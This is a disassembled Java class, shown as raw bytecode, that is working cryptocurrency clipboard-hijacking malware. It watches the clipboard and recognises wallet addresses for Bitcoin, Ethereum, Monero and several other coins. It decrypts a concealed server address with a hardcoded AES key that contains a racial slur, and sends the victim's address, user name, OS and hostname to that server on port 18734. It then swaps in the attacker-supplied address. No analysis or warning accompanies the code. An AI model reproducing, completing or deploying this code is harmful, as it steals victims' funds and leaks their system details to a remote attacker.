// class version 52.0 (52)
// access flags 0x21
public class T {

  // compiled from: 

  ATTRIBUTE Code : unknown
  // access flags 0x0
  INNERCLASS T$1 null null
  // access flags 0x609
  public static abstract INNERCLASS com/sun/jna/platform/win32/WinUser$HOOKPROC com/sun/jna/platform/win32/WinUser HOOKPROC
  // access flags 0x9
  public static INNERCLASS com/sun/jna/platform/win32/WinDef$HINSTANCE com/sun/jna/platform/win32/WinDef HINSTANCE
  // access flags 0x9
  public static INNERCLASS com/sun/jna/platform/win32/WinUser$HHOOK com/sun/jna/platform/win32/WinUser HHOOK
  // access flags 0x9
  public static INNERCLASS com/sun/jna/platform/win32/WinUser$MSG com/sun/jna/platform/win32/WinUser MSG
  // access flags 0x9
  public static INNERCLASS com/sun/jna/platform/win32/WinDef$HWND com/sun/jna/platform/win32/WinDef HWND
  // access flags 0x9
  public static INNERCLASS java/util/Base64$Decoder java/util/Base64 Decoder
  // access flags 0x609
  public static abstract INNERCLASS java/util/Map$Entry java/util/Map Entry
  // access flags 0x9
  public static INNERCLASS java/util/concurrent/ConcurrentHashMap$KeySetView java/util/concurrent/ConcurrentHashMap KeySetView
  // access flags 0x19
  public final static INNERCLASS java/lang/invoke/MethodHandles$Lookup java/lang/invoke/MethodHandles Lookup

  // access flags 0x9
  public static Lcom/sun/jna/platform/win32/WinUser$HHOOK; a

  // access flags 0x9
  // signature Ljava/util/Set<Ljava/lang/String;>;
  // declaration: a extends java.util.Set<java.lang.String>
  public static Ljava/util/Set; a

  // access flags 0x9
  // signature Ljava/util/concurrent/ConcurrentHashMap<Ljava/lang/String;Ljava/lang/String;>;
  // declaration: a extends java.util.concurrent.ConcurrentHashMap<java.lang.String, java.lang.String>
  public static Ljava/util/concurrent/ConcurrentHashMap; a

  // access flags 0x1
  public <init>()V
   L0
    LINENUMBER 29 L0
    ALOAD 0
    INVOKESPECIAL java/lang/Object.<init> ()V
    RETURN
    MAXSTACK = 1
    MAXLOCALS = 1

  // access flags 0x9
  public static a([Ljava/lang/String;)V throws java/lang/InterruptedException 
    // parameter  arr
   L0
    LINENUMBER 34 L0
    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;
    LDC "Starting"
    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V
   L1
    LINENUMBER 37 L1
    GETSTATIC com/sun/jna/platform/win32/User32.INSTANCE : Lcom/sun/jna/platform/win32/User32;
    BIPUSH 13
    NEW T$1
    DUP
    INVOKESPECIAL T$1.<init> ()V
    ACONST_NULL
    ICONST_0
    INVOKEINTERFACE com/sun/jna/platform/win32/User32.SetWindowsHookEx (ILcom/sun/jna/platform/win32/WinUser$HOOKPROC;Lcom/sun/jna/platform/win32/WinDef$HINSTANCE;I)Lcom/sun/jna/platform/win32/WinUser$HHOOK; (itf)
    PUTSTATIC T.a : Lcom/sun/jna/platform/win32/WinUser$HHOOK;
   L2
    LINENUMBER 45 L2
    GETSTATIC T.a : Lcom/sun/jna/platform/win32/WinUser$HHOOK;
    IFNONNULL L3
   L4
    LINENUMBER 46 L4
    RETURN
   L3
    LINENUMBER 47 L3
   FRAME CHOP 1
    NEW com/sun/jna/platform/win32/WinUser$MSG
    DUP
    INVOKESPECIAL com/sun/jna/platform/win32/WinUser$MSG.<init> ()V
    ASTORE 1
   L5
    LINENUMBER 49 L5
   FRAME APPEND [T com/sun/jna/platform/win32/WinUser$MSG]
    GETSTATIC com/sun/jna/platform/win32/User32.INSTANCE : Lcom/sun/jna/platform/win32/User32;
    ALOAD 1
    ACONST_NULL
    ICONST_0
    ICONST_0
    INVOKEINTERFACE com/sun/jna/platform/win32/User32.GetMessage (Lcom/sun/jna/platform/win32/WinUser$MSG;Lcom/sun/jna/platform/win32/WinDef$HWND;II)I (itf)
    POP
    GOTO L5
    MAXSTACK = 5
    MAXLOCALS = 2

  // access flags 0x9
  public static a()V
   L0
    LINENUMBER 62 L0
    NEW java/lang/Thread
    DUP
    INVOKEDYNAMIC run()Ljava/lang/Runnable; [
      // handle kind 0x6 : INVOKESTATIC
      java/lang/invoke/LambdaMetafactory.metafactory(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;
      // arguments:
      ()V, 
      // handle kind 0x6 : INVOKESTATIC
      T.b()V, 
      ()V
    ]
    INVOKESPECIAL java/lang/Thread.<init> (Ljava/lang/Runnable;)V
   L1
    LINENUMBER 85 L1
    INVOKEVIRTUAL java/lang/Thread.start ()V
   L2
    LINENUMBER 86 L2
    RETURN
    MAXSTACK = 3
    MAXLOCALS = 0

  // access flags 0x9
  public static a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String; throws java/lang/Exception 
    // parameter  string1
    // parameter  string2
    TRYCATCHBLOCK L0 L1 L2 java/lang/Exception
    TRYCATCHBLOCK L0 L3 L4 java/lang/Throwable
   L5
    LINENUMBER 97 L5
    GETSTATIC T.a : Ljava/util/concurrent/ConcurrentHashMap;
    ALOAD 1
    INVOKEVIRTUAL java/util/concurrent/ConcurrentHashMap.containsKey (Ljava/lang/Object;)Z
    IFEQ L6
   L7
    LINENUMBER 98 L7
    GETSTATIC T.a : Ljava/util/concurrent/ConcurrentHashMap;
    ALOAD 1
    INVOKEVIRTUAL java/util/concurrent/ConcurrentHashMap.get (Ljava/lang/Object;)Ljava/lang/Object;
    CHECKCAST java/lang/String
    ARETURN
   L6
    LINENUMBER 100 L6
   FRAME SAME
    INVOKESTATIC java/util/Base64.getDecoder ()Ljava/util/Base64$Decoder;
    LDC "NQ+PK/KEaGJxsR1W59WP3w=="
    INVOKEVIRTUAL java/util/Base64$Decoder.decode (Ljava/lang/String;)[B
    ASTORE 2
   L8
    LINENUMBER 101 L8
    LDC "AES/CBC/PKCS5Padding"
    INVOKESTATIC javax/crypto/Cipher.getInstance (Ljava/lang/String;)Ljavax/crypto/Cipher;
    ASTORE 3
   L9
    LINENUMBER 102 L9
    ALOAD 3
    ICONST_2
    NEW javax/crypto/spec/SecretKeySpec
    DUP
    LDC "negernegerneger1"
    INVOKEVIRTUAL java/lang/String.getBytes ()[B
    LDC "AES"
    INVOKESPECIAL javax/crypto/spec/SecretKeySpec.<init> ([BLjava/lang/String;)V
    NEW javax/crypto/spec/IvParameterSpec
    DUP
    LDC "negernegerneger1"
    INVOKEVIRTUAL java/lang/String.getBytes ()[B
    INVOKESPECIAL javax/crypto/spec/IvParameterSpec.<init> ([B)V
    INVOKEVIRTUAL javax/crypto/Cipher.init (ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V
   L10
    LINENUMBER 103 L10
    ALOAD 3
    ALOAD 2
    INVOKEVIRTUAL javax/crypto/Cipher.doFinal ([B)[B
    ASTORE 4
   L11
    LINENUMBER 104 L11
    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;
    NEW java/lang/String
    DUP
    ALOAD 4
    INVOKESPECIAL java/lang/String.<init> ([B)V
    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V
   L12
    LINENUMBER 105 L12
    NEW java/net/Socket
    DUP
    NEW java/lang/String
    DUP
    ALOAD 4
    INVOKESPECIAL java/lang/String.<init> ([B)V
    SIPUSH 18734
    INVOKESPECIAL java/net/Socket.<init> (Ljava/lang/String;I)V
    ASTORE 5
   L13
    LINENUMBER 107 L13
    NEW java/io/DataOutputStream
    DUP
    ALOAD 5
    INVOKEVIRTUAL java/net/Socket.getOutputStream ()Ljava/io/OutputStream;
    INVOKESPECIAL java/io/DataOutputStream.<init> (Ljava/io/OutputStream;)V
    ASTORE 6
   L14
    LINENUMBER 109 L14
    ALOAD 6
    LDC -889275714
    INVOKEVIRTUAL java/io/DataOutputStream.writeInt (I)V
   L15
    LINENUMBER 110 L15
    ALOAD 6
    ALOAD 0
    INVOKEVIRTUAL java/io/DataOutputStream.writeUTF (Ljava/lang/String;)V
   L16
    LINENUMBER 111 L16
    ALOAD 6
    ALOAD 1
    INVOKEVIRTUAL java/io/DataOutputStream.writeUTF (Ljava/lang/String;)V
   L0
    LINENUMBER 115 L0
    INVOKESTATIC W.a ()Z
    IFEQ L17
   L18
    LINENUMBER 116 L18
    LDC "HOSTNAME"
    INVOKESTATIC java/lang/System.getenv (Ljava/lang/String;)Ljava/lang/String;
    ASTORE 7
   L19
    LINENUMBER 117 L19
    ALOAD 7
    IFNONNULL L1
   L20
    LINENUMBER 118 L20
    LDC "unknown"
    ASTORE 7
    GOTO L1
   L17
    LINENUMBER 121 L17
   FRAME FULL [T java/lang/String T T T java/net/Socket java/io/DataOutputStream] []
    INVOKESTATIC java/net/InetAddress.getLocalHost ()Ljava/net/InetAddress;
    INVOKEVIRTUAL java/net/InetAddress.getHostName ()Ljava/lang/String;
    ASTORE 7
   L1
    LINENUMBER 125 L1
   FRAME APPEND [java/lang/String]
    GOTO L21
   L2
    LINENUMBER 123 L2
   FRAME FULL [T java/lang/String T T T java/net/Socket java/io/DataOutputStream] [java/lang/Exception]
    ASTORE 8
   L22
    LINENUMBER 124 L22
    LDC ""
    ASTORE 7
   L21
    LINENUMBER 126 L21
   FRAME APPEND [java/lang/String]
    ALOAD 6
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    LDC "user.name"
    INVOKESTATIC java/lang/System.getProperty (Ljava/lang/String;)Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC " "
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC "os.name"
    INVOKESTATIC java/lang/System.getProperty (Ljava/lang/String;)Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC " "
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    ALOAD 7
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    INVOKEVIRTUAL java/io/DataOutputStream.writeUTF (Ljava/lang/String;)V
   L3
    LINENUMBER 129 L3
    GOTO L23
   L4
    LINENUMBER 127 L4
   FRAME FULL [T java/lang/String T T T java/net/Socket] [java/lang/Throwable]
    ASTORE 7
   L23
    LINENUMBER 130 L23
   FRAME SAME
    NEW java/io/DataInputStream
    DUP
    ALOAD 5
    INVOKEVIRTUAL java/net/Socket.getInputStream ()Ljava/io/InputStream;
    INVOKESPECIAL java/io/DataInputStream.<init> (Ljava/io/InputStream;)V
    ASTORE 7
   L24
    LINENUMBER 132 L24
    ALOAD 7
    INVOKEVIRTUAL java/io/DataInputStream.readUTF ()Ljava/lang/String;
    ASTORE 8
   L25
    LINENUMBER 133 L25
    ALOAD 5
    INVOKEVIRTUAL java/net/Socket.close ()V
   L26
    LINENUMBER 134 L26
    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;
    ALOAD 8
    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V
   L27
    LINENUMBER 135 L27
    GETSTATIC T.a : Ljava/util/concurrent/ConcurrentHashMap;
    ALOAD 1
    ALOAD 8
    INVOKEVIRTUAL java/util/concurrent/ConcurrentHashMap.put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    POP
   L28
    LINENUMBER 136 L28
    GETSTATIC T.a : Ljava/util/Set;
    ALOAD 8
    INVOKEINTERFACE java/util/Set.add (Ljava/lang/Object;)Z (itf)
    POP
   L29
    LINENUMBER 137 L29
    ALOAD 8
    ARETURN
    MAXSTACK = 6
    MAXLOCALS = 9

  // access flags 0x9
  public static a(Ljava/lang/String;)Ljava/lang/String;
    // parameter  string
   L0
    LINENUMBER 142 L0
    ALOAD 0
    INVOKEVIRTUAL java/lang/String.length ()I
    BIPUSH 95
    IF_ICMPNE L1
    ALOAD 0
    ICONST_0
    INVOKEVIRTUAL java/lang/String.charAt (I)C
    BIPUSH 52
    IF_ICMPEQ L2
    ALOAD 0
    ICONST_0
    INVOKEVIRTUAL java/lang/String.charAt (I)C
    BIPUSH 56
    IF_ICMPNE L1
   L2
    LINENUMBER 143 L2
   FRAME CHOP 1
    LDC "XMR"
    ARETURN
   L1
    LINENUMBER 145 L1
   FRAME APPEND [java/lang/String]
    ALOAD 0
    INVOKEVIRTUAL java/lang/String.length ()I
    BIPUSH 42
    IF_ICMPNE L3
    ALOAD 0
    LDC "bnb1"
    INVOKEVIRTUAL java/lang/String.startsWith (Ljava/lang/String;)Z
    IFEQ L3
   L4
    LINENUMBER 146 L4
    LDC "BNB"
    ARETURN
   L3
    LINENUMBER 148 L3
   FRAME SAME
    ALOAD 0
    INVOKEVIRTUAL java/lang/String.length ()I
    BIPUSH 34
    IF_ICMPNE L5
    ALOAD 0
    ICONST_0
    INVOKEVIRTUAL java/lang/String.charAt (I)C
    BIPUSH 84
    IF_ICMPNE L5
    ALOAD 0
    LDC " "
    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
    IFNE L5
   L6
    LINENUMBER 149 L6
    LDC "TRX"
    ARETURN
   L5
    LINENUMBER 151 L5
   FRAME SAME
    ALOAD 0
    INVOKEVIRTUAL java/lang/String.length ()I
    BIPUSH 42
    IF_ICMPNE L7
    ALOAD 0
    LDC "0x3f"
    INVOKEVIRTUAL java/lang/String.startsWith (Ljava/lang/String;)Z
    IFEQ L7
   L8
    LINENUMBER 152 L8
    LDC "ETC"
    ARETURN
   L7
    LINENUMBER 154 L7
   FRAME SAME
    ALOAD 0
    INVOKEVIRTUAL java/lang/String.length ()I
    BIPUSH 42
    IF_ICMPNE L9
    ALOAD 0
    LDC "0x"
    INVOKEVIRTUAL java/lang/String.startsWith (Ljava/lang/String;)Z
    IFEQ L9
   L10
    LINENUMBER 155 L10
    LDC "ETH"
    ARETURN
   L9
    LINENUMBER 157 L9
   FRAME SAME
    ALOAD 0
    INVOKEVIRTUAL java/lang/String.length ()I
    BIPUSH 42
    IF_ICMPNE L11
    ALOAD 0
    LDC "bc1"
    INVOKEVIRTUAL java/lang/String.startsWith (Ljava/lang/String;)Z
    IFNE L12
   L11
   FRAME SAME
    ALOAD 0
    INVOKEVIRTUAL java/lang/String.length ()I
    BIPUSH 34
    IF_ICMPNE L13
    ALOAD 0
    LDC "1"
    INVOKEVIRTUAL java/lang/String.startsWith (Ljava/lang/String;)Z
    IFNE L12
   L13
   FRAME SAME
    ALOAD 0
   L14
    LINENUMBER 158 L14
    INVOKEVIRTUAL java/lang/String.length ()I
    BIPUSH 34
    IF_ICMPNE L15
    ALOAD 0
    LDC "3"
    INVOKEVIRTUAL java/lang/String.startsWith (Ljava/lang/String;)Z
    IFEQ L15
   L12
    LINENUMBER 159 L12
   FRAME CHOP 1
    LDC "BTC"
    ARETURN
   L15
    LINENUMBER 161 L15
   FRAME APPEND [java/lang/String]
    ALOAD 0
    INVOKEVIRTUAL java/lang/String.length ()I
    BIPUSH 58
    IF_ICMPNE L16
    ALOAD 0
    LDC "[A-Z2-7]{58}"
    INVOKEVIRTUAL java/lang/String.matches (Ljava/lang/String;)Z
    IFEQ L16
   L17
    LINENUMBER 162 L17
    LDC "ALGO"
    ARETURN
   L16
    LINENUMBER 165 L16
   FRAME SAME
    NEW java/util/TreeMap
    DUP
    INVOKESPECIAL java/util/TreeMap.<init> ()V
    ASTORE 1
   L18
    LINENUMBER 166 L18
    ALOAD 1
    LDC "DOGE"
    LDC "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$"
    INVOKEVIRTUAL java/util/TreeMap.put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    POP
   L19
    LINENUMBER 167 L19
    ALOAD 1
    LDC "LTC"
    LDC "^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
    INVOKEVIRTUAL java/util/TreeMap.put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    POP
   L20
    LINENUMBER 169 L20
    ALOAD 1
    LDC "BCH"
    LDC "^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$"
    INVOKEVIRTUAL java/util/TreeMap.put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    POP
   L21
    LINENUMBER 170 L21
    ALOAD 1
    LDC "SOL"
    LDC "(^[1-9A-HJ-NP-Za-km-z]{32,44}$)"
    INVOKEVIRTUAL java/util/TreeMap.put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    POP
   L22
    LINENUMBER 172 L22
    ALOAD 1
    INVOKEVIRTUAL java/util/TreeMap.entrySet ()Ljava/util/Set;
    INVOKEINTERFACE java/util/Set.iterator ()Ljava/util/Iterator; (itf)
    ASTORE 2
   L23
   FRAME APPEND [T java/util/Iterator]
    ALOAD 2
    INVOKEINTERFACE java/util/Iterator.hasNext ()Z (itf)
    IFEQ L24
    ALOAD 2
    INVOKEINTERFACE java/util/Iterator.next ()Ljava/lang/Object; (itf)
    CHECKCAST java/util/Map$Entry
    ASTORE 3
   L25
    LINENUMBER 173 L25
    ALOAD 0
    ALOAD 3
    INVOKEINTERFACE java/util/Map$Entry.getValue ()Ljava/lang/Object; (itf)
    CHECKCAST java/lang/String
    INVOKEVIRTUAL java/lang/String.matches (Ljava/lang/String;)Z
    IFEQ L26
   L27
    LINENUMBER 174 L27
    ALOAD 3
    INVOKEINTERFACE java/util/Map$Entry.getKey ()Ljava/lang/Object; (itf)
    CHECKCAST java/lang/String
    ARETURN
   L26
    LINENUMBER 176 L26
   FRAME SAME
    GOTO L23
   L24
    LINENUMBER 177 L24
   FRAME CHOP 3
    LDC ""
    ARETURN
    MAXSTACK = 3
    MAXLOCALS = 4

  // access flags 0x100A
  private static synthetic b()V
    TRYCATCHBLOCK L0 L1 L2 java/lang/InterruptedException
    TRYCATCHBLOCK L3 L4 L5 java/lang/Exception
    TRYCATCHBLOCK L6 L7 L5 java/lang/Exception
   L8
    LINENUMBER 63 L8
    INVOKESTATIC java/awt/Toolkit.getDefaultToolkit ()Ljava/awt/Toolkit;
    INVOKEVIRTUAL java/awt/Toolkit.getSystemClipboard ()Ljava/awt/datatransfer/Clipboard;
    ASTORE 0
   L0
    LINENUMBER 66 L0
   FRAME APPEND [java/awt/datatransfer/Clipboard]
    LDC 100
    INVOKESTATIC java/lang/Thread.sleep (J)V
   L1
    LINENUMBER 69 L1
    GOTO L3
   L2
    LINENUMBER 67 L2
   FRAME FULL [] [java/lang/InterruptedException]
    ASTORE 1
   L9
    LINENUMBER 68 L9
    NEW java/lang/RuntimeException
    DUP
    ALOAD 1
    INVOKESPECIAL java/lang/RuntimeException.<init> (Ljava/lang/Throwable;)V
    ATHROW
   L3
    LINENUMBER 71 L3
   FRAME APPEND [java/awt/datatransfer/Clipboard]
    ALOAD 0
    GETSTATIC java/awt/datatransfer/DataFlavor.stringFlavor : Ljava/awt/datatransfer/DataFlavor;
    INVOKEVIRTUAL java/awt/datatransfer/Clipboard.getData (Ljava/awt/datatransfer/DataFlavor;)Ljava/lang/Object;
    CHECKCAST java/lang/String
    ASTORE 1
   L10
    LINENUMBER 73 L10
    GETSTATIC T.a : Ljava/util/Set;
    ALOAD 1
    INVOKEINTERFACE java/util/Set.contains (Ljava/lang/Object;)Z (itf)
    IFEQ L6
   L4
    LINENUMBER 74 L4
    GOTO L0
   L6
    LINENUMBER 77 L6
   FRAME APPEND [java/lang/String]
    ALOAD 1
    INVOKESTATIC T.a (Ljava/lang/String;)Ljava/lang/String;
    ASTORE 2
   L11
    LINENUMBER 78 L11
    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;
    ALOAD 2
    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V
   L12
    LINENUMBER 79 L12
    ALOAD 2
    INVOKEVIRTUAL java/lang/String.isEmpty ()Z
    IFNE L7
   L13
    LINENUMBER 80 L13
    ALOAD 2
    ALOAD 1
    INVOKESTATIC T.a (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    ASTORE 3
   L14
    LINENUMBER 81 L14
    ALOAD 0
    NEW java/awt/datatransfer/StringSelection
    DUP
    ALOAD 3
    INVOKESPECIAL java/awt/datatransfer/StringSelection.<init> (Ljava/lang/String;)V
    ACONST_NULL
    INVOKEVIRTUAL java/awt/datatransfer/Clipboard.setContents (Ljava/awt/datatransfer/Transferable;Ljava/awt/datatransfer/ClipboardOwner;)V
   L7
    LINENUMBER 83 L7
   FRAME CHOP 1
    GOTO L0
   L5
   FRAME SAME1 java/lang/Exception
    ASTORE 1
    ALOAD 1
    INVOKEVIRTUAL java/lang/Exception.printStackTrace ()V
    GOTO L0
    MAXSTACK = 4
    MAXLOCALS = 4

  // access flags 0x8
  static <clinit>()V
   L0
    LINENUMBER 89 L0
    INVOKESTATIC java/util/concurrent/ConcurrentHashMap.newKeySet ()Ljava/util/concurrent/ConcurrentHashMap$KeySetView;
    PUTSTATIC T.a : Ljava/util/Set;
   L1
    LINENUMBER 93 L1
    NEW java/util/concurrent/ConcurrentHashMap
    DUP
    INVOKESPECIAL java/util/concurrent/ConcurrentHashMap.<init> ()V
    PUTSTATIC T.a : Ljava/util/concurrent/ConcurrentHashMap;
    RETURN
    MAXSTACK = 2
    MAXLOCALS = 0
}
